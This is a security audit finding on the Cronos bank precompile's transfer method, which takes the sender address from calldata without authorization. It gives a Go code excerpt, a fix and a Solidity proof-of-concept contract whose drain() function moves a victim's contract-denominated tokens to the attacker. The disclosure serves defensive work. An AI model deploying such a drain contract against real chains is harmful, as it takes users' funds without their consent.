### Title
Unauthorized Native Token Transfer via Missing Caller Authorization in Bank Precompile `transfer` Method - (File: x/cronos/keeper/precompiles/bank.go)

### Summary
The `transfer` method of the bank precompile at `0x0000000000000000000000000000000000000064` accepts an arbitrary `sender` address from calldata without verifying it matches the calling contract or that the sender has authorized the transfer. Any deployed contract can invoke `bank.transfer(victimAddress, attackerAddress, amount)` to drain `evm/<callerContract>` denomination tokens from any account that holds them, without the token holder's consent.

### Finding Description
The bank precompile's `Run` function handles the `transfer` method as follows:

```go
case TransferMethodName:
    args, err := method.Inputs.Unpack(contract.Input[4:])
    ...
    sender    := args[0].(common.Address)   // taken from calldata — arbitrary
    recipient := args[1].(common.Address)
    amount    := args[2].(*big.Int)
    ...
    from := sdk.AccAddress(sender.Bytes())
    to   := sdk.AccAddress(recipient.Bytes())
    ...
    denom := EVMDenom(contract.Caller())    // evm/<callerContract>
    amt   := sdk.NewCoin(denom, sdkmath.NewIntFromBigInt(amount))

        ...
        if err := bc.bankKeeper.SendCoins(ctx, from, to, sdk.NewCoins(amt)); err != nil {
``` [1](#0-0) 

The `sender` (`from`) is taken directly from the ABI-decoded calldata arguments. There is no check that `sender == contract.Caller()` and no approval mechanism. The denom is `evm/<callerContract>`, so the tokens being moved are the calling contract's own denomination. Any contract can therefore call `bank.transfer(victimAddr, attackerAddr, amount)` and the precompile will execute `bankKeeper.SendCoins(victim, attacker, coins)` unconditionally.

The `mint` method (same switch block) correctly uses `contract.Caller()` to derive the denom, but the `transfer` method never validates that the `sender` argument is the calling contract or an approved delegate. [2](#0-1) 

The bank precompile is registered and exposed to the EVM as a precompiled contract at address `0x64`, as documented in the wiki and referenced in `TestBank.sol`: [3](#0-2) 

### Impact Explanation
**Critical — Unauthorized transfer of precompile-controlled assets.**

Any unprivileged attacker who deploys a contract can drain `evm/<attackerContract>` denomination tokens from any account that holds them. In a realistic DeFi scenario:

1. A protocol issues `evm/<protocolContract>` tokens to users as deposit receipts or LP shares (via `bank.mint`).
2. The protocol contract (or a malicious contract with the same address) calls `bank.transfer(user, attacker, balance)`.
3. All users' receipt tokens are transferred to the attacker without any approval or signature from the users.
4. Users can no longer redeem underlying assets.

This matches the Critical impact category: *"Unauthorized mint, burn, transfer, bridge, conversion, escrow release, or balance/accounting change for … precompile-controlled assets."*

### Likelihood Explanation
The entry path is fully unprivileged: any EOA can deploy a contract and call the bank precompile. No admin keys, governance, or special roles are required. The only precondition is that users hold `evm/<attackerContract>` tokens, which is achievable by operating a legitimate-looking DeFi protocol that issues such tokens before executing the drain.

### Recommendation
Add a caller-authorization check in the `transfer` case. The simplest fix is to require that the `sender` argument equals `contract.Caller()` (i.e., the contract can only transfer from itself):

```go
case TransferMethodName:
    ...
    if sender != contract.Caller() {
        return nil, errors.New("transfer: sender must be the calling contract")
    }
```

Alternatively, implement an ERC20-style allowance mapping so users can explicitly approve a contract to transfer on their behalf.

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IBankModule {
    function transfer(address sender, address recipient, uint256 amount)
        external payable returns (bool);
    function balanceOf(address token, address account)
        external view returns (uint256);
}

contract AttackerContract {
    IBankModule constant bank =
        IBankModule(0x0000000000000000000000000000000000000064);

    // Step 1: attacker mints evm/<this> tokens to victim (e.g. as DeFi receipts)
    // Step 2: attacker calls drain() to steal them back without victim's consent
    function drain(address victim) external {
        uint256 bal = bank.balanceOf(address(this), victim);
        // No approval from victim required — sender is taken from calldata
        bank.transfer(victim, msg.sender, bal);
    }
}
```

`drain(victimAddress)` calls `bank.transfer(victim, attacker, balance)`. The precompile executes `bankKeeper.SendCoins(victim, attacker, coins)` for denom `evm/<AttackerContract>` with no authorization check, successfully draining the victim's balance. [1](#0-0) [4](#0-3)
